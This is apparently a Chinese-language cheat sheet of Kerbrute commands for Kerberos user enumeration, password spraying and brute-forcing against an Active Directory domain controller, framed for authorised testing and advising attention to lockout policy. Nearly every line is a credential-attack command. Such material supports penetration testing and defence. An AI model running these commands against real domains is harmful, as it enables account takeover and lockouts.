# Kerbrute 常用用法

这篇记录 Kerbrute 的常用命令。它适合在授权 AD 环境里做 Kerberos 用户枚举和凭据验证，常用于整理有效用户名。

## 用户枚举

枚举用户名。

```bash
kerbrute userenum --dc 192.168.1.10 -d example.local users.txt
```

指定线程。

```bash
kerbrute userenum --dc 192.168.1.10 -d example.local users.txt -t 10
```

保存输出。

```bash
kerbrute userenum --dc 192.168.1.10 -d example.local users.txt -o kerbrute-users.txt
```

## 密码验证

单密码验证用户列表。

```bash
kerbrute passwordspray --dc 192.168.1.10 -d example.local users.txt 'PASSWORD'
```

指定延迟。

```bash
kerbrute passwordspray --dc 192.168.1.10 -d example.local users.txt 'PASSWORD' --delay 1000
```

安全一点的喷洒节奏。

```bash
kerbrute passwordspray --dc 192.168.1.10 -d example.local users.txt 'PASSWORD' --safe
```

## 凭据组合

验证单个账号。

```bash
kerbrute bruteuser --dc 192.168.1.10 -d example.local passwords.txt USER
```

验证用户密码组合。

```bash
kerbrute bruteforce --dc 192.168.1.10 -d example.local userpass.txt
```

## 备注

Kerbrute 的结果适合和 LDAP、SMB 枚举结果互相印证。密码喷洒要关注锁定策略，先查密码策略，再决定节奏和次数。
